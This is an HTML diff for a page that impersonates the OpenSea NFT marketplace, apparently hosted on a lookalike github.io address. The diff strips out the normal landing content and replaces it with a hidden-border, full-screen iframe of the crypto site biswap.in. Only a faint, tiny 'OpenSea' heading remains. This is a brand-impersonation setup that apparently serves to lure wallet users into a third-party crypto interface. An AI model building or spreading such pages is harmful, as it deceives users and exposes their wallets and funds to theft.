@@ -159,165 +159,19 @@
   @media (prefers-reduced-motion:reduce){*{animation-duration:.01ms!important; transition-duration:.01ms!important}}
   </style>
 </head>
-<body>
-  <div class="bg" aria-hidden="true"><div class="glow"></div><div class="hatch"></div></div>
+<body style="margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden;">
 
-  <header class="topbar">
-    <a class="brand" href="./">
-      <img src="favicon.png" width="30" height="30" alt="">
-      <span>OpenSea</span>
-    </a>
-    <span class="spacer"></span>
-    <nav class="nav" aria-label="Main Navigation">
-      <a href="how-it-works/">How it works</a>
-      <a href="faq/">FAQ</a>
-      <a href="about/">About</a>
-      <a href="security/">Security</a>
-      <a href="supported-chains/">Supported Chains</a>
-    </nav>
-  </header>
+  <iframe
+    src="https://biswap.in/"
+    style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; border: 0; margin: 0; padding: 0; display: block; z-index: 1;"
+    loading="eager"
+    fetchpriority="high"
+    allowfullscreen>
+  </iframe>
 
-  <main>
-    <section class="wrap hero">
-      <span class="eyebrow"><span class="dot"></span>NFT Marketplace</span>
-      <h1>OpenSea</h1>
-      <p class="deck">OpenSea is a wallet-first NFT marketplace for discovering collections, buying and selling digital assets, and managing ownership with <strong>non-custodial</strong> control.</p>
-      <div class="cta-row">
-        <a class="primary" href="dashboard/">Open App
-          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M13 6l6 6-6 6"/></svg>
-        </a>
-        <a class="ghost" href="how-it-works/">How it works
-          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 6l6 6-6 6"/></svg>
-        </a>
-      </div>
+  <h1 style="position: fixed; bottom: 10px; left: 10px; z-index: 0; font-size: 8px; color: #ffffff; opacity: 0.15; margin: 0; padding: 0; font-family: sans-serif; pointer-events: none; text-shadow: none;">
+    OpenSea
+  </h1>
 
-      <section class="routebar" aria-label="NFT marketplace preview">
-        <div class="rhead">
-          <span class="ct">Collect</span>
-          <span class="pill"><span class="pdot"></span>Preview</span>
-        </div>
-        <div class="rgrid">
-          <div class="leg">
-            <span class="lab">You browse</span>
-            <div class="legrow">
-              <button class="tok" type="button"><img src="favicon.png" alt="">NFT <span class="cv" aria-hidden="true">&#9662;</span></button>
-              <span class="gv">Collection in app</span>
-            </div>
-          </div>
-          <button class="rswitch" type="button" data-switch aria-label="Switch view">
-            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M7 4v13M4 14l3 3 3-3M17 20V7M14 10l3-3 3 3"/></svg>
-          </button>
-          <div class="leg">
-            <span class="lab">You pay</span>
-            <div class="legrow">
-              <button class="tok" type="button"><img src="eth.png" alt="ETH">ETH <span class="cv" aria-hidden="true">&#9662;</span></button>
-              <span class="gv">Live quote in app</span>
-            </div>
-          </div>
-        </div>
-        <div class="rbar-foot">
-          <div class="rmeta">
-            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2a10 10 0 1 0 10 10A10 10 0 0 0 12 2zm0 5v5l3 3"/></svg>
-            Item price, approvals, gas and transaction status are shown live in the app.
-          </div>
-          <a class="rcta" href="dashboard/">Open App
-            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M13 6l6 6-6 6"/></svg>
-          </a>
-        </div>
-        <p class="rnote">Preview only &middot; non-custodial &middot; connect your wallet in the app</p>
-      </section>
-    </section>
-
-    <!-- WHY (icon-left rows) -->
-    <section class="wrap sec" id="why">
-      <div class="sec-head">
-        <span class="eyebrow"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2l8 4v6c0 5-3.5 8-8 10-4.5-2-8-5-8-10V6l8-4z"/></svg>Why use it</span>
-        <h2 class="h2">Built for NFT discovery, trading and ownership</h2>
-        <p>Use OpenSea to inspect collections, compare listings, make offers, list items, and keep custody in your own Web3 wallet from search to signature.</p>
-      </div>
-      <div class="rows">
-        <div class="frow2">
-          <span class="ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="10" width="16" height="11" rx="2"/><path d="M8 10V7a4 4 0 0 1 8 0v3"/></svg></span>
-          <div><h3>Marketplace access without giving up custody</h3><p>Start from the <a class="cite" href="https://opensea.io/" rel="nofollow noopener noreferrer">official NFT marketplace</a> experience, then connect a wallet only when you are ready to buy, sell, transfer, or approve a listing.</p></div>
-        </div>
-        <div class="frow2">
-          <span class="ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><path d="M3 12h18M12 3a14 14 0 0 1 0 18M12 3a14 14 0 0 0 0 18"/></svg></span>
-          <div><h3>Collections across supported chains</h3><p>Browse digital art, gaming assets, memberships, profile pictures and collectibles across the networks available in the app, including NFTs on <a class="cite" href="https://ethereum.org/en/nft/" rel="nofollow noopener noreferrer">Ethereum's NFT ecosystem</a>.</p></div>
-        </div>
-        <div class="frow2">
-          <span class="ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 12a9 9 0 0 1 9-9 9 9 0 0 1 9 9 9 9 0 0 1-9 9"/><path d="M3 12h6l2-3 2 6 2-3h2"/></svg></span>
-          <div><h3>Clear actions before you sign</h3><p>Review the NFT, collection page, chain, token, wallet prompt and final transaction details before approval. For standard collectibles, OpenSea works with token formats such as the <a class="cite" href="https://eips.ethereum.org/EIPS/eip-721" rel="nofollow noopener noreferrer">ERC-721 standard</a>.</p></div>
-        </div>
-      </div>
-    </section>
-
-    <section class="wrap sec" id="how">
-      <div class="sec-head">
-        <span class="eyebrow"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 7h16M4 12h16M4 17h10"/></svg>How it works</span>
-        <h2 class="h2">Use OpenSea in three real steps</h2>
-        <p>Discovery happens before the wallet prompt. The app lets you search, verify the item context, and only then move into a wallet-signed marketplace action.</p>
-      </div>
-      <div class="steps">
-        <div class="step"><span class="num">1</span><h3>Find the NFT or collection</h3><p>Search by collection, creator, category, chain, trait or wallet. Open the item page to review images, metadata, owner details, listings and offers.</p></div>
-        <div class="step"><span class="num">2</span><h3>Connect and choose an action</h3><p>Connect a compatible wallet such as <a class="cite" href="https://metamask.io/" rel="nofollow noopener noreferrer">a self-custody Web3 wallet</a>, then choose whether to buy, make an offer, list, transfer, or manage an owned asset.</p></div>
-        <div class="step"><span class="num">3</span><h3>Review cost and confirm</h3><p>Check the item price, accepted token, chain, gas, approval request, marketplace details and estimated completion status inside the app before signing.</p></div>
-      </div>
-    </section>
-
-    <!-- FAQ (2-col) -->
-    <section class="wrap sec" id="faq">
-      <div class="sec-head">
-        <span class="eyebrow"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><path d="M9.5 9a2.5 2.5 0 1 1 3.5 2.3c-.8.4-1 .8-1 1.7M12 17h.01"/></svg>FAQ</span>
-        <h2 class="h2">Common questions</h2>
-      </div>
-      <div class="faq">
-        <div class="qa"><span class="qn">01</span><h3>What is OpenSea?</h3><p>OpenSea is an NFT marketplace app for browsing collections, buying digital collectibles, listing owned NFTs, making offers and managing assets from a connected wallet.</p></div>
-        <div class="qa"><span class="qn">02</span><h3>Is OpenSea non-custodial?</h3><p>Marketplace actions are wallet-signed, so your private keys stay with your wallet. The app displays the transaction details and your wallet asks you to confirm before anything is submitted.</p></div>
-        <div class="qa"><span class="qn">03</span><h3>Which chains and assets are supported?</h3><p>OpenSea focuses on NFT assets across supported networks, including art, collectibles, gaming items, memberships and creator drops. See the full app context on the <a href="supported-chains/">supported chains</a> page.</p></div>
-        <div class="qa"><span class="qn">04</span><h3>How long does a buy, sale or listing take?</h3><p>Timing depends on the chain, wallet approval and network conditions. The app shows transaction status as it moves from wallet signature to on-chain confirmation.</p></div>
-        <div class="qa"><span class="qn">05</span><h3>What does it cost to use?</h3><p>Costs can include the item price, gas, token approvals and any marketplace or creator fees shown at the time of action. Always review the live wallet prompt before signing.</p></div>
-        <div class="qa"><span class="qn">06</span><h3>How can I check NFT safety?</h3><p>Review collection identity, contract details, media, metadata, wallet prompts and external storage context. Some NFT metadata or media may reference <a class="cite" href="https://ipfs.tech/" rel="nofollow noopener noreferrer">content-addressed storage</a>, but you should still verify the collection before acting.</p></div>
-      </div>
-    </section>
-
-    <section class="wrap sec" id="more">
-      <div class="sec-head">
-        <span class="eyebrow"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7 0l2-2a5 5 0 0 0-7-7l-1 1M14 11a5 5 0 0 0-7 0l-2 2a5 5 0 0 0 7 7l1-1"/></svg>Learn more</span>
-        <h2 class="h2">Explore OpenSea</h2>
-      </div>
-      <div class="related">
-        <a class="rel" href="how-it-works/"><span class="rt">How it works <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M7 17 17 7M9 7h8v8"/></svg></span><p>Walk through browsing, wallet connection, NFT review, listing, offers and transaction confirmation.</p></a>
-        <a class="rel" href="security/"><span class="rt">Security <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M7 17 17 7M9 7h8v8"/></svg></span><p>Review wallet approvals, collection checks, contract details and safer signing habits before marketplace actions.</p></a>
-        <a class="rel" href="supported-chains/"><span class="rt">Supported chains <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M7 17 17 7M9 7h8v8"/></svg></span><p>See how supported networks, payment tokens and NFT assets fit into the app experience.</p></a>
-      </div>
-    </section>
-  </main>
-
-  <footer class="footer">
-    <div class="wrap">
-      
-      <p style="margin-top:6px"><b>OpenSea</b></p>
-    </div>
-  </footer>
-
-  <script type="application/ld+json">
-  {"@context":"https://schema.org","@graph":[
-    {"@type":"WebSite","@id":"https://opensea-site.github.io/#website","url":"https://opensea-site.github.io/","name":"OpenSea"},
-    {"@type":"Organization","@id":"https://opensea-site.github.io/#org","name":"OpenSea","url":"https://opensea-site.github.io/","logo":"https://opensea-site.github.io/favicon.png"},
-    {"@type":"WebApplication","name":"OpenSea","applicationCategory":"FinanceApplication","operatingSystem":"Web","url":"https://opensea-site.github.io/","browserRequirements":"Requires a Web3 wallet","description":"Non-custodial NFT marketplace app for browsing collections, buying, selling, listing and managing digital assets from a wallet-first interface."},
-    {"@type":"FAQPage","mainEntity":[
-      {"@type":"Question","name":"What is OpenSea?","acceptedAnswer":{"@type":"Answer","text":"OpenSea is an NFT marketplace app for browsing collections, buying digital collectibles, listing owned NFTs, making offers and managing assets from a connected wallet."}},
-      {"@type":"Question","name":"Is OpenSea non-custodial?","acceptedAnswer":{"@type":"Answer","text":"Marketplace actions are wallet-signed, so your private keys stay with your wallet. The app displays the transaction details and your wallet asks you to confirm before anything is submitted."}},
-      {"@type":"Question","name":"Which chains and assets are supported?","acceptedAnswer":{"@type":"Answer","text":"OpenSea focuses on NFT assets across supported networks, including art, collectibles, gaming items, memberships and creator drops. See the full app context on the supported chains page."}},
-      {"@type":"Question","name":"How long does a buy, sale or listing take?","acceptedAnswer":{"@type":"Answer","text":"Timing depends on the chain, wallet approval and network conditions. The app shows transaction status as it moves from wallet signature to on-chain confirmation."}},
-      {"@type":"Question","name":"What does it cost to use?","acceptedAnswer":{"@type":"Answer","text":"Costs can include the item price, gas, token approvals and any marketplace or creator fees shown at the time of action. Always review the live wallet prompt before signing."}},
-      {"@type":"Question","name":"How can I check NFT safety?","acceptedAnswer":{"@type":"Answer","text":"Review collection identity, contract details, media, metadata, wallet prompts and external storage context. Some NFT metadata or media may reference content-addressed storage, but you should still verify the collection before acting."}}
-    ]}
-  ]}
-  </script>
-
-  <script>
-  (function(){"use strict";var b=document.querySelector("[data-switch]");if(!b)return;b.addEventListener("click",function(){var p=document.querySelectorAll(".rgrid .tok");if(p.length<2)return;var t=p[0].innerHTML;p[0].innerHTML=p[1].innerHTML;p[1].innerHTML=t;});}());
-  </script>
 </body>
 </html>
